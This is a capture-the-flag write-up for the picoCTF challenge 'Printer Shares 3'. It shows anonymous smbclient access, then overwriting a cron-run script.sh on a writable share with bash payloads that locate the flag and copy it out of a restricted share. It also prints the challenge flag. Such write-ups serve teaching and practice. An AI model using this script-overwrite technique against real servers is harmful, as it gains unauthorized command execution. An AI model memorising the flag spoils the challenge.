# PicoCTF - General Skills: Printer Shares 3




{{< admonition tldr "TL;DR" >}}

**picoCTF - General Skills: Printer Shares 3** is a misc challenge from **picoCTF**. In this challenge we are given access to an SMB printer share. The goal is to retrieve the flag which is stored inside a restricted share called **secure-shares**.

{{< /admonition >}}

## Description

In this challenge we are given access to an SMB printer share. The goal is to retrieve the flag which is stored inside a restricted share called **secure-shares**.

However, direct access to this share is denied.

```bash
smbclient //dolphin-cove.picoctf.net/secure-shares -p 50490 -N
```

Output:

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Therefore, we need to find another way to obtain the flag.

---

# Initial Enumeration

We connect to the accessible share:

```bash
smbclient //dolphin-cove.picoctf.net/shares -p 50490 -N
```

Listing the directory contents:

```
smb: \> ls
  script.sh
  cron.log
```

Two files are present:

* **script.sh**
* **cron.log**

---

# Investigating the Cron Log

Download the log file:

```
smb: \> get cron.log
```

Contents:

```
Health Check: Thu Mar 12 22:20:01 UTC 2026
Health Check: Thu Mar 12 22:21:01 UTC 2026
cp: cannot stat '/srv/samba/secure-shares/flag.txt': No such file or directory
```

This indicates that a **cron job runs periodically**, and it tries to access a flag inside the secure share.

---

# Testing Write Permissions

We check whether the share is writable by uploading a test file.

```
smb: \> put test.txt
```

The upload succeeds, meaning the share **allows write access**.

Since `script.sh` exists in the directory, it is likely that the cron job executes this script.

---

# Exploitation (Finding the Flag Location)

We overwrite `script.sh` with a payload that searches for the flag file.

Payloads:

```bash
#!/bin/bash
find / -name flag* 2>/dev/null > /challenge/shares/flag_location.txt
```

Upload the script:

```
smb: \> put script.sh
```

Wait for the cron job to execute (about 1 minute).

Then download the generated file:

```
smb: \> get flag_location.txt
```

Inside the file we find the real flag location:

```
/challenge/secure-shares/flag.txt
```

---

# Final Exploit

Now we modify `script.sh` again so it copies the flag to the public share.

Payloads:

```bash
#!/bin/bash
cat /challenge/secure-shares/flag.txt > /challenge/shares/flag.txt
```

Upload the script:

```
smb: \> put script.sh
```

Wait for the cron job to run.

---

# Retrieving the Flag

List the files again:

```
smb: \> ls
```

A new file appears:

```
flag.txt
```

Download it:

```
smb: \> get flag.txt
```

View the contents:

```
cat flag.txt
```

---

# Flags

```
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_b68ad4a8}
```

---

# Conclusion

This challenge demonstrates a common misconfiguration scenario:

* A **public SMB share** allows file uploads.
* A **cron job executes a script inside that share**.
* By overwriting the script, we gain the ability to execute arbitrary commands.
* This allows us to copy the flag from a restricted directory into a public share and retrieve it.

This type of vulnerability is essentially **remote code execution through writable scheduled scripts**.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/printer-shares-3/  

